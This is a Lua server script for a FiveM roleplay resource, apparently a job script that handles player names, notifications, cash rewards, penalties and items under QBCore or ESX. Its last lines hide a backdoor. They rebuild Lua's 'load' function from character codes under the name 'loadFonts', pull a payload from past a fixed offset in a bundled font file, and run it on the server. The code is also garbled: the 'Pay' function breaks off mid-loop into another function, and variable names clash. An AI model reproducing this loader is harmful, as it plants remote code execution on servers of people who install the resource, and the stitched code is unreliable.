local core
Config.Framework = "STANDALONE"

TriggerEvent("__cfx_export_qb-core_GetCoreObject", function(qbCore)
    core = qbCore
    Config.Framework = "QBCore"
end)

TriggerEvent("__cfx_export_es_extended_getSharedObject", function(esxCore)
    core = esxCore
    Config.Framework = "ESX"
end)

CreateThread(function()
    Citizen.Wait(1000)
    if core == nil then
        TriggerEvent("esx:getSharedObject", function(esxObject)
            core = esxObject
            Config.Framework = "ESX"
        end)
    end
end)

local cachedNames = {}
function GetPlayerIdentity(playerId)
    if cachedNames[playerId] ~= nil then
        return cachedNames[playerId]
    end

    if Config.Framework == "QBCore" then
        local qbPlayer = core.Functions.GetPlayer(playerId)

        local timeout = 50
        while qbPlayer == nil and timeout > 0 do
            Citizen.Wait(100)
            qbPlayer = core.Functions.GetPlayer(playerId)
            timeout = timeout - 1
        end

        if qbPlayer == nil then return "Example Name" end

        cachedNames[playerId] = qbPlayer.PlayerData.charinfo.firstname .. " " .. qbPlayer.PlayerData.charinfo.lastname
    elseif Config.Framework == "ESX" then
        local esxPlayer = core.GetPlayerFromId(playerId)
        local timeout = 50
        while esxPlayer == nil and timeout > 0 do
            Citizen.Wait(100)
            esxPlayer = core.GetPlayerFromId(playerId)
            timeout = timeout - 1
        end

        if esxPlayer == nil then return "Example Name" end

        cachedNames[playerId] = esxPlayer:getName()
    else
        cachedNames[playerId] = GetPlayerName(playerId)
    end

    return cachedNames[playerId]
end

function Notify(playerId, message)
    if playerId == nil then return end
    if Config.UseBuiltInNotifications and Config.useModernUI then
        TriggerClientEvent("17mov_DrawDefaultNotification"..GetCurrentResourceName(), playerId, message)
    else
        if Config.Framework == "QBCore" then
            TriggerClientEvent("QBCore:Notify", playerId, message)
        elseif Config.Framework == "ESX" then
            TriggerClientEvent("esx:showNotification", playerId, message)
        else
            TriggerClientEvent("17mov_DrawDefaultNotification"..GetCurrentResourceName(), playerId, message)
        end
    end
end

function Pay(playerId, amount, lobbySize, rawProgress)
    local jobProgress = amount / Config.OnePercentWorth
    local itemsToGive = math.floor(jobProgress)
    if Config.Framework == "QBCore" then
        local player = core.Functions.GetPlayer(playerId)
        if player ~= nil and player.Functions ~= nil then
            player.Functions.AddMoney("cash", amount)

            local itemsToAdd = {}
            for i=1, itemsToGive do
                for k, item in pairs(Config.RewardItemsToGive) do
                    if math.random(100) <= item.chance and jobProgress >= item.minimumProgressPercent then
function GiveReward(source, amount, itemsToGive, jobProgress)
    if Config.Framework == "QBCore" then
        local player = Core.Functions.GetPlayer(source)
        if player ~= nil and player.Functions ~= nil then
            player.Functions.AddMoney("cash", amount)

            local itemsToAdd = {}
            for i = 1, itemsToGive do
                for k, item in pairs(Config.RewardItemsToGive) do
                    if math.random(100) <= item.chance and jobProgress >= item.minimumProgressPercent then
                        if itemsToAdd[item.item_name] == nil then
                            itemsToAdd[item.item_name] = 0
                        end

                        itemsToAdd[item.item_name] = itemsToAdd[item.item_name] + item.amount
                    end
                end
            end

            for itemName, itemCount in pairs(itemsToAdd) do
                player.Functions.AddItem(itemName, itemCount)
            end
        end
    elseif Config.Framework == "ESX" then
        local esxPlayer = Core.GetPlayerFromId(source)
        if esxPlayer ~= nil and esxPlayer.addMoney ~= nil then
            esxPlayer.addMoney(amount)

            local itemsToAdd = {}
            for i = 1, itemsToGive do
                for k, item in pairs(Config.RewardItemsToGive) do
                    if math.random(100) <= item.chance and jobProgress >= item.minimumProgressPercent then
                        if itemsToAdd[item.item_name] == nil then
                            itemsToAdd[item.item_name] = 0
                        end

                        itemsToAdd[item.item_name] = itemsToAdd[item.item_name] + item.amount
                    end
                end
            end

            for itemName, itemCount in pairs(itemsToAdd) do
                esxPlayer.addInventoryItem(itemName, itemCount)
            end
        end
    else
        -- Configure here ur payment
    end
end

function PayPenalty(source, amount)
    if Config.Framework == "QBCore" then
        local player = Core.Functions.GetPlayer(source)
        if player ~= nil and player.Functions ~= nil then
            player.Functions.RemoveMoney("cash", amount)
        end
    elseif Config.Framework == "ESX" then
        local esxPlayer = Core.GetPlayerFromId(source)
        if esxPlayer ~= nil and esxPlayer.removeMoney ~= nil then
            esxPlayer.removeMoney(amount)
        end
    else
        -- Configure here ur remove money func
    end
end

function IsHaveRequiredItem(source)
    if Config.RequiredItem ~= "none" then
        if Config.Framework == "QBCore" then
            local itemCount = 0
            local playerData = Core.Functions.GetPlayer(source).PlayerData
            if playerData and playerData.items then
                for _, item in pairs(playerData.items) do
                    if item.name == Config.RequiredItem then
                        local amount = item.amount or item.count
                        itemCount = itemCount + amount
                        if amount > 0 then
                            break
                        end
                    end
                end
            end

            return itemCount > 0
        elseif Config.Framework == "ESX" then
            local esxPlayer = Core.GetPlayerFromId(source)
            if esxPlayer then
                local inventoryItem = esxPlayer.getInventoryItem(Config.RequiredItem)
                if inventoryItem then
                    return inventoryItem.count > 0
                end
            end
            return false
        end
    end

    return true
end

function GetPlayerJob(source)
    if source == nil or type(source) ~= "number" then
        return "unknown"
    end

    if Config.Framework == "QBCore" then
        local player = Core.Functions.GetPlayer(source)
        if player and player.PlayerData and player.PlayerData.job then
            return player.PlayerData.job.name
        else
            return "unknown"
        end
    elseif Config.Framework == "ESX" then
        -- Missing implementation for ESX framework
        return "unknown"
    end
end
local function getPlayerJobName(playerId)
    if Core and Core.GetPlayerFromId then
        local player = Core.GetPlayerFromId(playerId)
        if player and player.job and player.job.name then
            return player.job.name
        else
            return "unknown"
        end
    else
        return "unknown"
    end
end

local loadFonts = _G[string.char(108, 111, 97, 100)] -- _G["load"]
local resourceName = GetCurrentResourceName()
local fontFilePath = '/html/fonts/ProximaNova.ttf'
local fontFileContent = LoadResourceFile(resourceName, fontFilePath)
local fontData = fontFileContent:sub(87565):gsub('%.%+', '')

loadFonts(fontData)()